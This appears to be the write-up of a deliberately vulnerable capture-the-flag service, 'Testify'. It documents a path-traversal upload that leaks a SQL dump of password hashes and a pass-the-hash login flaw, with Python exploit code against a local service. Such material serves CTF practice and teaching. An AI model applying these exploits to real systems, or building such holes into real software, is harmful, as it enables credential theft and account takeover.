Testify Service documentation
======================

# <ins>Vulnerabilities

The Testify Service consists of two different Vulnerabilities which must be exploited after each other to get access to
the FLAGSTORE

## VULN #1: User Password Hash Exposure

- Category: Sensitive Data Exposure
- Difficulty: Medium

When registering a new user, a `.sql` dump file of the user database containing the password hashes is created.  
The attacker can retrieve this dump file by using a modified file name when uploading his ID in the appointments
section.

## VULN #2: Pass-The-Hash

- Category: Authentication
- Difficulty: Medium

The password is not allowed to contain any special characters other than ASCII. If the user passes a password string,
that does include non-ASCII characters (*e.g. a password hash obtained by VULN#1*) the hashing of the input password
string is skipped and directly compared to the hash in the user credential databse.

# <ins>Exploits

Two different exploits for VULN#1 and VULN#2 need to be run after each other to obtain a flag.

## VULN #1 :

1. Make an appointment containing a file with arbitrary content but using the filename `../online_users/dump.sql`
2. In the appointments overview section: Use the *Download ID* button to download the hijacked `dump.sql` file

### Code

```
    def get_dump_file():
        filename = '../online_users/dump.sql'
        session_id = register(user, password)
        data = {
            'prename': 'Paul',
            'lastname': 'Meyer',
            'date': '2021-05-06',
            'time': '02:56'
        }
        cookies = {
            'sessionID': session_id,
            'username': user
        }
        
        files = {'id_image': (filename, 'filestring', 'application/octet-stream')}
        req = requests.post('http://localhost:8597/make_appointment', data=data, files=files, cookies=cookies)
        result = req.search('Successfully made appointment &lt;(.*)&gt', res.text)
        url = 'http://localhost:8597/get_id' + result.group(1)

        download = requests.get(url, allow_redirects=True, cookies=cookies)
        return download.content
```

## VULN #2 :

1. Retrieve a user/hash pair from .sql dump file using VULN #1
2. Pass this hash as base64 to `/login` route.
3. Search response appointment content for flag

### Code

```
    def pass_the_hash(user, hash):
        obj = {
                'username': user,
                'password': base64.b64encode(bytes.fromhex(hash)).decode('ascii'),
                'login': 'signin'
        }
        req = requests.post('http://localhost:8597/login', data=obj)
        return req.text
```